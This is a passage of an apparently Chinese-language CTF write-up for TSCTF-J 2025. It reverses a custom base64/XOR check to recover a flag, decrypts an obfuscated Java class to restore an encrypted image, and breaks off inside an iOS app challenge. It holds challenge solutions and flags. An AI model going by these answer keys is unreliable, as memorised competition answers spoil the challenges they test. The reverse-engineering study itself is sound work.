&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">4</span> * ((i_1 + <span class="number">2</span>) / <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">-6</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; i_1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (v10 &lt;&lt; <span class="number">8</span>) + *(<span class="type">unsigned</span> __int8 *)(a1 + i);</span><br><span class="line">    <span class="keyword">for</span> ( v9 += <span class="number">8</span>; v9 &gt;= <span class="number">0</span>; v9 -= <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v8++;</span><br><span class="line">      v6[v3] = aAbcdefghijklmn[(v10 &gt;&gt; v9) &amp; <span class="number">0x3F</span>];<span class="comment">// &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 &gt;= <span class="number">-5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v8++;</span><br><span class="line">    v6[v4] = aAbcdefghijklmn[(v10 &lt;&lt; <span class="number">8</span> &gt;&gt; (v9 + <span class="number">8</span>)) &amp; <span class="number">0x3F</span>];<span class="comment">// &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v8 &lt; <span class="number">4</span> * ((i_1 + <span class="number">2</span>) / <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v8++;</span><br><span class="line">    v6[v5] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6[v8] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001488</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">    result = <span class="built_in">sub_140001450</span>(i + a1, a1 + (<span class="number">7</span> * i + <span class="number">5</span>) % <span class="number">64</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先求自定义的base64编码表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_custom_base64_table</span>():</span><br><span class="line">    <span class="comment"># 标准Base64字符表</span></span><br><span class="line">    original_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换为列表以便进行交换操作</span></span><br><span class="line">    table_list = <span class="built_in">list</span>(original_table)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按照sub_140001488函数的逻辑打乱字符表</span></span><br><span class="line">    <span class="comment"># 循环64次，每次交换特定位置的字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="comment"># 计算要交换的位置：(7 * i + 5) % 64</span></span><br><span class="line">        pos = (<span class="number">7</span> * i + <span class="number">5</span>) % <span class="number">64</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 交换位置i和pos的字符</span></span><br><span class="line">        table_list[i], table_list[pos] = table_list[pos], table_list[i]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换回字符串并返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(table_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成并打印自定义Base64编码表</span></span><br><span class="line">custom_table = generate_custom_base64_table()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;自定义Base64编码表:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(custom_table)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n编码表长度:&quot;</span>, <span class="built_in">len</span>(custom_table))</span><br></pre></td></tr></table></figure>
<p>得到编码表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VkbKJo3PNcCSZQGXdUaLEwOet07jxAWmlsDqp9uf1Riy5F2nIB6rh4/+g8TzMYHv</span><br></pre></td></tr></table></figure>
<p>将WelcomeToTSCTF 用自定义的base64编码表编码得到密钥<img src="/2025/11/14/TSCTFwp/image-18.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w/w5t/YF0wUnwoQKwJt=</span><br></pre></td></tr></table></figure>
<p>用这个与buf1 数值异或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">23 7C 34 61 32 02 13 3D  67 12 64 0D 37 02 34 14  03 7A 2B 69 24 70 34 61  32 70 6B 76 02 42</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/14/TSCTFwp/image-19.png" alt="alt text"><br>TSCTF-J{We1c@me_t0_TS_CTF_2025}</p>
<h2 id="听绿的秘密"><a href="#听绿的秘密" class="headerlink" title="听绿的秘密"></a>听绿的秘密</h2><p>用ja-gui 对tinglv.jar 逆向 获得以下代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runner</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CustomClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String resourceName;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomClassLoader</span><span class="params">(String param1String)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.resourceName = param1String;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String param1String) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> getResourceAsStream(<span class="built_in">this</span>.resourceName);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (inputStream == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Resource not found: &quot;</span> + <span class="built_in">this</span>.resourceName); </span><br><span class="line">          <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">          <span class="type">byte</span>[] arrayOfByte1 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">          <span class="type">int</span> i;</span><br><span class="line">          <span class="keyword">while</span> ((i = inputStream.read(arrayOfByte1, <span class="number">0</span>, arrayOfByte1.length)) != -<span class="number">1</span>)</span><br><span class="line">            byteArrayOutputStream.write(arrayOfByte1, <span class="number">0</span>, i); </span><br><span class="line">          byteArrayOutputStream.flush();</span><br><span class="line">          <span class="type">byte</span>[] arrayOfByte2 = byteArrayOutputStream.toByteArray();</span><br><span class="line">          <span class="type">byte</span>[] arrayOfByte3 = <span class="keyword">new</span> <span class="title class_">byte</span>[arrayOfByte2.length];</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>; b &lt; arrayOfByte2.length; b++)</span><br><span class="line">            arrayOfByte3[b] = (<span class="type">byte</span>)(arrayOfByte2[b] - <span class="number">7</span>); </span><br><span class="line">          Class&lt;?&gt; clazz = defineClass(param1String, arrayOfByte3, <span class="number">0</span>, arrayOfByte3.length);</span><br><span class="line">          <span class="keyword">if</span> (inputStream != <span class="literal">null</span>)</span><br><span class="line">            inputStream.close(); </span><br><span class="line">          <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">          <span class="keyword">if</span> (inputStream != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              inputStream.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable throwable1) &#123;</span><br><span class="line">              throwable.addSuppressed(throwable1);</span><br><span class="line">            &#125;  </span><br><span class="line">          <span class="keyword">throw</span> throwable;</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException iOException) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Can&#x27;t read this: &quot;</span> + param1String, iOException);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] paramArrayOfString)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Secret.obf&quot;</span>;</span><br><span class="line">      <span class="type">CustomClassLoader</span> <span class="variable">customClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomClassLoader</span>(str);</span><br><span class="line">      Class&lt;?&gt; clazz = customClassLoader.loadClass(<span class="string">&quot;Secret&quot;</span>);</span><br><span class="line">      <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String[].class &#125;);</span><br><span class="line">      method.invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; paramArrayOfString &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">      System.err.println(<span class="string">&quot;Error: &quot;</span> + exception.getMessage());</span><br><span class="line">      exception.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析代码逻辑<br>解密secret.obf，执行解密后secret.class的程序 ，对cat.png加密得到Where_is_my_cat.png图片</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加密时：原始类文件（.class）的每个字节加 7，得到加密文件（Secret.obf）；</span><br><span class="line">解密时：CustomClassLoader对Secret.obf的每个字节减 7，还原出原始的.class字节码。</span><br></pre></td></tr></table></figure>
<p>先将secret.obf 文件解密得到secret.class</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.OpenOption;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Secret</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] var0)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;2 args required.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Path</span> <span class="variable">var1</span> <span class="operator">=</span> Paths.get(var0[<span class="number">0</span>]);</span><br><span class="line">            <span class="type">Path</span> <span class="variable">var2</span> <span class="operator">=</span> Paths.get(var0[<span class="number">1</span>]);</span><br><span class="line">            <span class="type">byte</span>[] var3 = Files.readAllBytes(var1);</span><br><span class="line">            <span class="type">byte</span>[] var4 = Arrays.copyOf(var3, var3.length);</span><br><span class="line">            <span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="number">0</span>; var6 &lt; var4.length; ++var6) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> var4[var6] &amp; <span class="number">255</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">var8</span> <span class="operator">=</span> (var6 + var5) % <span class="number">8</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">var9</span> <span class="operator">=</span> var7 + var6 % <span class="number">251</span> + var5 &amp; <span class="number">255</span>;</span><br><span class="line">                <span class="type">int</span> var10;</span><br><span class="line">                <span class="keyword">if</span> (var8 == <span class="number">0</span>) &#123;</span><br><span class="line">                    var10 = var9;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    var10 = (var9 &lt;&lt; var8 | var9 &gt;&gt;&gt; <span class="number">8</span> - var8) &amp; <span class="number">255</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var4[var6] = (<span class="type">byte</span>)var10;</span><br><span class="line">                var5 = var5 + var10 + <span class="number">37</span> &amp; <span class="number">255</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Files.write(var2, var4, <span class="keyword">new</span> <span class="title class_">OpenOption</span>[<span class="number">0</span>]);</span><br><span class="line">            System.out.println(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据secret.class 的加密流程写出解密文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.OpenOption;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Decrypt</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 打印当前工作目录（帮助确认文件位置）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">currentDir</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;当前工作目录: &quot;</span> + currentDir);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可以使用绝对路径（例如：&quot;C:/Users/你的用户名/Desktop/Where_is_my_cat.png&quot;）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">encryptedFile</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\link\\Desktop\\untitled2\\src\\Where_is_my_cat.png&quot;</span>; <span class="comment">// 这里可以替换为绝对路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">decryptedFile</span> <span class="operator">=</span> <span class="string">&quot;cat.png&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Path</span> <span class="variable">encryptedPath</span> <span class="operator">=</span> Paths.get(encryptedFile);</span><br><span class="line">        <span class="type">Path</span> <span class="variable">decryptedPath</span> <span class="operator">=</span> Paths.get(decryptedFile);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(encryptedPath)) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;错误：找不到文件 &quot;</span> + encryptedPath.toAbsolutePath());</span><br><span class="line">            System.err.println(<span class="string">&quot;请确认文件是否在上述工作目录中，或修改代码中的文件路径&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取加密文件内容</span></span><br><span class="line">        <span class="type">byte</span>[] encryptedData = Files.readAllBytes(encryptedPath);</span><br><span class="line">        <span class="type">byte</span>[] decryptedData = <span class="keyword">new</span> <span class="title class_">byte</span>[encryptedData.length];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始值与加密时相同</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="number">0</span>; var6 &lt; encryptedData.length; ++var6) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var10</span> <span class="operator">=</span> encryptedData[var6] &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var8</span> <span class="operator">=</span> (var6 + var5) % <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> var9;</span><br><span class="line">            <span class="keyword">if</span> (var8 == <span class="number">0</span>) &#123;</span><br><span class="line">                var9 = var10;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 逆转循环左移：进行循环右移var8位</span></span><br><span class="line">                var9 = (var10 &gt;&gt;&gt; var8 | var10 &lt;&lt; (<span class="number">8</span> - var8)) &amp; <span class="number">255</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 计算原始值</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">originalValue</span> <span class="operator">=</span> (var9 - (var6 % <span class="number">251</span>) - var5) &amp; <span class="number">255</span>;</span><br><span class="line">            decryptedData[var6] = (<span class="type">byte</span>) originalValue;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 更新var5（与加密时逻辑一致）</span></span><br><span class="line">            var5 = (var5 + var10 + <span class="number">37</span>) &amp; <span class="number">255</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入解密后的文件</span></span><br><span class="line">        Files.write(decryptedPath, decryptedData, <span class="keyword">new</span> <span class="title class_">OpenOption</span>[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(<span class="string">&quot;解密完成，文件已保存为: &quot;</span> + decryptedPath.toAbsolutePath());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行程序 得到图片 <img src="/2025/11/14/TSCTFwp/image-20.png" alt="alt text"></p>
<h2 id="CryDancing"><a href="#CryDancing" class="headerlink" title="CryDancing"></a>CryDancing</h2><p>解压 ipa文件 对CryDancing 用ida 反汇编 得到如下</p>
<h3 id="主要程序"><a href="#主要程序" class="headerlink" title="主要程序"></a>主要程序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl -[ViewController checkInput:](ViewController *self, SEL a2, id a3)</span><br><span class="line">&#123;</span><br><span class="line">  UITextField *self_1; <span class="comment">// x21</span></span><br><span class="line">  NSString *obj; <span class="comment">// x19</span></span><br><span class="line">  id self_2; <span class="comment">// x21</span></span><br><span class="line">  <span class="type">const</span> __CFString *v7; <span class="comment">// x2</span></span><br><span class="line">  <span class="type">const</span> __CFString *v8; <span class="comment">// x3</span></span><br><span class="line"></span><br><span class="line">  self_1 = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(-[ViewController textField](self, <span class="string">&quot;textField&quot;</span>, a3));</span><br><span class="line">  obj = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(-[UITextField text](self_1, <span class="string">&quot;text&quot;</span>));</span><br><span class="line">  <span class="built_in">objc_release</span>(self_1);</span><br><span class="line">  self_2 = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(+[LynsSecret YouCanSeeThisRight:](&amp;OBJC_CLASS___LynsSecret, <span class="string">&quot;YouCanSeeThisRight:&quot;</span>, obj));</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">objc_msgSend</span>(</span><br><span class="line">                       self_2,</span><br><span class="line">                       <span class="string">&quot;isEqualToString:&quot;</span>,</span><br><span class="line">                       <span class="built_in">CFSTR</span>(<span class="string">&quot;bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g==&quot;</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">CFSTR</span>(<span class="string">&quot;成功&quot;</span>);</span><br><span class="line">    v8 = <span class="built_in">CFSTR</span>(<span class="string">&quot;恭喜你！&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">CFSTR</span>(<span class="string">&quot;错误&quot;</span>);</span><br><span class="line">    v8 = <span class="built_in">CFSTR</span>(<span class="string">&quot;好像不对哦！&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  -[ViewController showAlertWithTitle:message:](self, <span class="string">&quot;showAlertWithTitle:message:&quot;</span>, v7, v8);</span><br><span class="line">  <span class="built_in">objc_release</span>(self_2);</span><br><span class="line">  <span class="built_in">objc_release</span>(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逻辑： 将flag 加密后的base值与bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g&#x3D;&#x3D;对比</p>
<h3 id="加密flag程序"><a href="#加密flag程序" class="headerlink" title="加密flag程序"></a>加密flag程序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">id __cdecl 